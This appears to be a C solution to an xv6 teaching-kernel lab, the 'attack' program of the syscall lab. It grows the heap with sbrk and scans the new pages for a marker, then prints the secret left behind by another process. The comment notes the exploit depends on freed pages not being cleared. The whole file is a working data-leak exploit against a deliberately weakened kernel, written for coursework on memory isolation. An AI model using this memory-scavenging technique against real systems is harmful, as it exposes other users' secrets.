#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define MARKER    "Here it is: "
#define SCANPAGES 32
#define MAXSECRET 128

static int
issecretchar(char c)
{
  return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'z') ||
         (c >= 'A' && c <= 'Z');
}

// Pages freed by secret are handed back by sbrk() without being cleared
// (LAB_SYSCALL), so the secret can still be found in our new heap.
int
main(int argc, char *argv[])
{
  char secret[MAXSECRET + 1];
  int mlen = strlen(MARKER);
  int total = SCANPAGES * PGSIZE;
  char *heap;
  int i, n;

  if ((heap = sbrk(total)) == SBRK_ERROR) {
    fprintf(2, "attack: sbrk failed\n");
    exit(1);
  }

  for (i = 0; i + mlen < total; i++) {
    if (memcmp(heap + i, MARKER, mlen) != 0)
      continue;
    for (n = 0; n < MAXSECRET && i + mlen + n < total &&
                issecretchar(heap[i + mlen + n]);
         n++)
      secret[n] = heap[i + mlen + n];
    if (n == 0)
      continue;
    secret[n] = '\0';
    printf("%s\n", secret);
    exit(0);
  }

  fprintf(2, "attack: secret not found\n");
  exit(1);
}
